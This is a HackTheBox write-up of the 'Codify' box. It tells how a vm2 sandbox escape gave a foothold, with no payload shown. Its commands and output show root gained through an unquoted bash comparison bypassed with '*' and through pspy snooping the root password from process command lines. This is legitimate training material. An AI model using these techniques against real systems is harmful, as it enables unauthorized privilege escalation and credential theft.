Codify

HackTheBox Writeup

Box Name: Codify

Difficulty: Easy

OS: Linux

Date Completed: 25-06-2026

IP Address: 10.129.21.70

Summary

Enumeration showed 3 ports were open, SSH, HTTP and NodeJS on 22, 80 and 3000 respectively. When enumerating the website I found a NodeJS editor and a security package being used. When researching this package it turned out to be vulnerable for NodeJS payload in the editor. By using the CVE-2023-30547 PoC, I could get a reverse shell as the user svc. When further enumerating the box I found another NodeJS service that had a database file with a hash. When cracking this hash I could login as the user. From user enumeration I found a bash script that I could run as sudo. When examining the script, I could see two flaws. With these flaws I could bypass the password restriction and snoop the root password in processes with the pspy tool. When the pspy tool showed the password in plaintext, I could login as root and fully compromise the box.

Initial Foothold

Vulnerability Discovery

As I noted in the previous screenshot there was a visible security package called vm2. The box runs version 3.9.16. Searching this version shows a PoC CVE which explains a sandbox escape exploit.

CVE: CVE-2023-30547

Exploitation

Privilege Escalation

Enumeration

When I got access to the user, I immediately ran sudo -l. This showed that the user could run a SQL backup bash script. I tried to run the script and see what the script was built like.

joshua@codify:~$ sudo -l
User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh

joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
if [[ $DB_PASS == $USER_PASS ]]; then
    /usr/bin/echo "Password confirmed!"
else
    /usr/bin/echo "Password confirmation failed!"
    exit 1
fi
...

When I run the script with sudo it still asked for my password. The password of joshua is not the correct one. I went to dig deeper into the backup script.

Exploitation

When checking the script and doing some research on bash scripting, I noticed two flaws. One flaw was in the password validation, where the right side of the comparison is not double quoted — a classic bash pitfall. Another flaw is that the password gets referenced from /root/.creds, which means I can snoop the processes to catch it. I found the pspy tool for this.

First I checked if the bypass works for the first bash pitfall. Because [[ $DB_PASS == $USER_PASS ]] is unquoted on the right side, supplying a wildcard * matches any value.

joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: *
Password confirmed!
Backing up database: mysql
All databases backed up successfully!

This worked. Next step is to run two SSH sessions as Joshua to run the script and the pspy tool to snoop.

# attacker host
python3 -m http.server 8080
# target, session 1
~/pspy32
# target, session 2
sudo /opt/scripts/mysql-backup.sh
📷 Save screenshot here as codify_06.png
pspy output revealing the root MySQL password in a process command line

After a short while I found the password passed in plaintext on the mysql command line that the root-run script spawns. Now I can run su root in my session as Joshua and enter the found password.

joshua@codify:~$ su root
Password:
root@codify:/home/joshua# cat /root/root.txt

I can read the root flag and the box is now pwned!

Key Takeaways

  • Enumerating the website thoroughly and gathering all information can lead to a more clear and direct attack vector.
  • Researching the version numbers of software for CVE's can yield great results for exploitation.
  • A reverse shell from a website is not always www-data but can be any user that the admin has configured to run the webservice with.
  • Structural and methodical enumeration of the Linux filesystem is a must to effectively search for sensitive info.
  • Knowledge and good research about bash scripting was a valuable addition to find weaknesses in the script.
